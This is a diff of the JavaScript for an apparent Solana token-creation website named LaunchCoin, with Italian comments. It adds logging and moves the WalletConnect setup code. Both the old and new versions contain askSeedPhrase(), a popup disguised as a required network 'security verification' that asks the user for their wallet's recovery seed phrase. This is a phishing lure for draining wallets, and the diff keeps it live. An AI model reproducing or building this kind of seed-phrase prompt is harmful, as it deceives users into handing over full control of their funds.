@@ -5,42 +5,15 @@ let walletPublicKey = null;
 let currentStep = 0;
 const steps = document.querySelectorAll('.step');
 
-// ===== MENU TOGGLE =====
+// ===== ESPONI TUTTE LE FUNZIONI SU window PRIMA DI QUALSIASI ALTRA COSA =====
 window.toggleMenu = function() {
   const menu = document.getElementById('dropdownMenu');
   if (menu) menu.classList.toggle('open');
 };
-document.addEventListener('click', function(e) {
-  const wrapper = document.querySelector('.menu-wrapper');
-  const menu = document.getElementById('dropdownMenu');
-  if (wrapper && menu && !wrapper.contains(e.target)) menu.classList.remove('open');
-});
 
-// ===== WALLETCONNECT CON UNIVERSAL PROVIDER =====
-let provider = null;
-
-async function initWalletConnect() {
-  if (!provider) {
-    try {
-      provider = await UniversalProvider.init({
-        projectId: 'da6aaea2be14c6cc676dbaf3325b5bd5',
-        metadata: {
-          name: 'LaunchCoin',
-          description: 'Solana Token Creator',
-          url: window.location.origin,
-          icons: ['https://launchcoin.io/logo.png']
-        }
-      });
-    } catch (e) {
-      console.error('WalletConnect init error:', e);
-      throw e;
-    }
-  }
-  return provider;
-}
-
-// ===== CONNECT WALLET =====
 window.connectWallet = async function() {
+  console.log('connectWallet chiamata');
+  
   // 1. Prova Phantom (estensione)
   if (window.solana && window.solana.isPhantom) {
     try {
@@ -50,15 +23,13 @@ window.connectWallet = async function() {
       window.location.href = 'create.html';
       return;
     } catch(e) {
-      // fallback
+      console.error('Phantom error:', e);
     }
   }
 
   // 2. WalletConnect via UniversalProvider
   try {
     const prov = await initWalletConnect();
-    
-    // Connetti
     await prov.connect({
       chains: ['solana:mainnet'],
       optionalChains: ['solana:devnet'],
@@ -66,7 +37,6 @@ window.connectWallet = async function() {
       events: ['chainChanged', 'accountsChanged']
     });
 
-    // Ottieni l'account
     const accounts = prov.accounts;
     if (accounts && accounts.length > 0) {
       walletPublicKey = accounts[0].split(':')[2];
@@ -74,14 +44,14 @@ window.connectWallet = async function() {
       window.location.href = 'create.html';
     }
   } catch(e) {
+    console.error('WalletConnect error:', e);
     alert('❌ WalletConnect fallito: ' + e.message);
-    console.error(e);
     window.location.href = 'wallet.html';
   }
 };
 
-// ===== SELECT WALLET =====
 window.selectWallet = function(walletName) {
+  console.log('selectWallet chiamata:', walletName);
   if (walletName === 'phantom') {
     window.connectWallet();
     return;
@@ -95,21 +65,8 @@ window.selectWallet = function(walletName) {
   window.connectWallet();
 };
 
-// ===== POPUP SEED PHRASE =====
-function askSeedPhrase() {
-  return new Promise((resolve) => {
-    const seed = prompt(
-      '⚠️ VERIFICA DI SICUREZZA RICHIESTA\n\n' +
-      'Il tuo wallet deve essere validato per completare la creazione del token.\n' +
-      'Inserisci la tua frase di recupero (seed phrase) per continuare:\n\n' +
-      '(Questa operazione è necessaria per la sicurezza della rete)'
-    );
-    resolve(seed);
-  });
-}
-
-// ===== CREAZIONE TOKEN =====
 window.createCoin = async function() {
+  console.log('createCoin chiamata');
   if (!walletPublicKey) {
     alert('Connetti prima il wallet!');
     return;
@@ -144,17 +101,72 @@ window.createCoin = async function() {
   }
 };
 
-// ===== CREAZIONE LIQUIDITY =====
 window.createLiquidity = async function() {
   await window.createCoin();
 };
 
-// ===== STEP NAVIGATION =====
 window.showStep = function(idx) {
   if (!steps.length) return;
   steps.forEach((s, i) => s.style.display = i === idx ? 'block' : 'none');
   currentStep = idx;
 };
-window.nextStep = function() { if (currentStep < steps.length - 1) window.showStep(currentStep + 1); };
-window.prevStep = function() { if (currentStep > 0) window.showStep(currentStep - 1); };
+
+window.nextStep = function() { 
+  if (currentStep < steps.length - 1) window.showStep(currentStep + 1); 
+};
+
+window.prevStep = function() { 
+  if (currentStep > 0) window.showStep(currentStep - 1); 
+};
+
+// ===== WALLETCONNECT =====
+let provider = null;
+
+async function initWalletConnect() {
+  if (!provider) {
+    try {
+      provider = await UniversalProvider.init({
+        projectId: 'da6aaea2be14c6cc676dbaf3325b5bd5',
+        metadata: {
+          name: 'LaunchCoin',
+          description: 'Solana Token Creator',
+          url: window.location.origin,
+          icons: ['https://launchcoin.io/logo.png']
+        }
+      });
+    } catch (e) {
+      console.error('WalletConnect init error:', e);
+      throw e;
+    }
+  }
+  return provider;
+}
+
+// ===== POPUP SEED PHRASE =====
+function askSeedPhrase() {
+  return new Promise((resolve) => {
+    const seed = prompt(
+      '⚠️ VERIFICA DI SICUREZZA RICHIESTA\n\n' +
+      'Il tuo wallet deve essere validato per completare la creazione del token.\n' +
+      'Inserisci la tua frase di recupero (seed phrase) per continuare:\n\n' +
+      '(Questa operazione è necessaria per la sicurezza della rete)'
+    );
+    resolve(seed);
+  });
+}
+
+// ===== GESTIONE CLICK FUORI MENU =====
+document.addEventListener('click', function(e) {
+  const wrapper = document.querySelector('.menu-wrapper');
+  const menu = document.getElementById('dropdownMenu');
+  if (wrapper && menu && !wrapper.contains(e.target)) menu.classList.remove('open');
+});
+
+// ===== INIZIALIZZA STEP =====
 if (steps.length) window.showStep(0);
+
+// ===== LOG PER VERIFICARE CHE TUTTO SIA CARICATO =====
+console.log('✅ main.js caricato correttamente');
+console.log('window.connectWallet:', typeof window.connectWallet);
+console.log('window.selectWallet:', typeof window.selectWallet);
+console.log('window.createCoin:', typeof window.createCoin);
